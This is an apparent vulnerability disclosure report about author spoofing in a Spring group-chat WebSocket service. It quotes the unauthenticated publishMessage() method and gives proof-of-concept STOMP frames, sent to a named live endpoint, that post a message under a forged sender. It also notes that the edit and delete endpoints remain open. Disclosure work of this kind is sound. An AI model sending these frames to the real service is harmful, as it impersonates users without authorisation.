+++
title = "VRE-0001-author-spoofing"
date = 2026-10-23
+++

| Field | Value |
|---|---|
| VRE ID | VRE-0001 |
| Author | mataiodoxion, ex1stencee |
| VRE | OCS VRE Team |
| Date | 2026-10-16 |
| Severity | High |
| Status | In Review |
| Affected Product | Spring |
| Affected Project | Group Chat |


## Description

`publishMessage()` does not perform any authentication or validation for `sender` field, which is client controlled.
```java
public GroupChatEvent publishMessage(Long groupId, String sender, String message, String image) {
    Groups group = getGroupOrThrow(groupId);

    String date = Instant.now().toString();
    GroupChatMessage persisted = new GroupChatMessage(sender, message, date, image);
    groupChatService.addMessage(group.getName(), persisted);

    GroupChatEvent event = GroupChatEvent.builder()
            .context("sendMessageServer")
            .groupId(groupId)
            .messageId(persisted.getId())
            .sender(sender)
            .message(message)
            .image(image)
            .date(date)
            .build();

    broadcastToGroup(groupId, event);
    return event;
}
```
[blob](https://github.com/Open-Coding-Society/spring/blob/e9009a54acb96f8878a0d02ce536ecde33442854/src/main/java/com/open/spring/mvc/groups/GroupChatRealtimeService.java)

## Impact

Messages to the spring group chat Websocket endpoint can have spoofed author fields due to lack of authentication. Both the Websocket and HTTP endpoints are vulnerable (since the latter passes messages to the Websocket service).

## Proof of Concept (PoC)

Tested against endpoint `wss://spring.opencodingsociety.com/ws-chat/105/wdmpbqjv/websocket`
```
["CONNECT\naccept-version:1.1,1.0\nheart-beat:10000,10000\n\n\u0000"]

["SUBSCRIBE\nid:sub-0\ndestination:/topic/group/1227\n\n\u0000"]

["SEND\ndestination:/app/groups.chat\ncontent-length:121\n\n{\"context\":\"sendMessage\",\"groupId\":1227,\"sender\":\"spoofed\",\"message\":\"hi\",\"image\":null,\"date\":\"2026-10-16T17:45:25.569Z\"}\u0000"]
```

![author spoofing](/images/vre-0001-author-spoofing/author-spoofing.png)


## Suggested Fix 

Fix proposed in [#213](https://github.com/Open-Coding-Society/spring/pull/213).

## References

This section intentionally left blank.


## Notes

The `editMessage()` and `deleteMessage()` endpoints are still vulnerable.
